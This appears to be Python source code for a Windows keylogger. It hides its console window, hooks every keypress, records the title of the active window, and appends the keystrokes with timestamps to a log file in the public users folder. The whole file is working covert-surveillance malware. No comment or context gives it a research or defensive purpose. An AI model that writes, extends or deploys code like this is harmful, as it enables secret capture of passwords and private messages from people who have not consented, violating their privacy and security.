import keyboard
from datetime import datetime 
import ctypes

kernel32 = ctypes.windll.kernel32
user32 = ctypes.windll.user32
user32.ShowWindow(kernel32.GetConsoleWindow(), 0)
filename = "log.txt" 

def get_current_window():

    GetForegroundWindow = user32.GetForegroundWindow
    GetWindowTextLength = user32.GetWindowTextLengthW
    GetWindowText = user32.GetWindowTextW

    hwnd = GetForegroundWindow()
    length = GetWindowTextLength(hwnd)
    buff = ctypes.create_unicode_buffer(length + 1)
    
    GetWindowText(hwnd, buff, length + 1)

    return buff.value

def write_to(file, content): 
  file.write(content)

def get_timestamp(): 
  return(round(datetime.now().timestamp()))

def write_key(key):
  global key_info 
  global key_list 
  global prev_window 

  window = get_current_window()

  if(window==prev_window): 
    key_info.append(str(key.name) + " | " + " | " + str(round(key.time))) 
    key_list.append(str(key.name))
    return 
  content = ("Date - " + str(datetime.now()) + " | Timestamp - " + str(get_timestamp()) + "\nWindow - " + str(get_current_window()) + "\nKeys - \n" + str("\n".join(key_info)) + "\n" + ", ".join(key_list) + "\n")
  out = open("c:/users/public/" + str(filename), "a")
  write_to(out, content)
  out.close()
  key_info = []
  key_list = [] 
  prev_window = window
  key_info.append(str(key.name) + " | " + str(key.scan_code) + " | " + str(round(key.time)))
  key_list.append(str(key.name))


def prepare():
  global key_info
  global key_list 
  global prev_window 
  
  key_info = []
  key_list = [] 
  prev_window = str()
  keyboard.on_press(write_key) 
  keyboard.wait() 
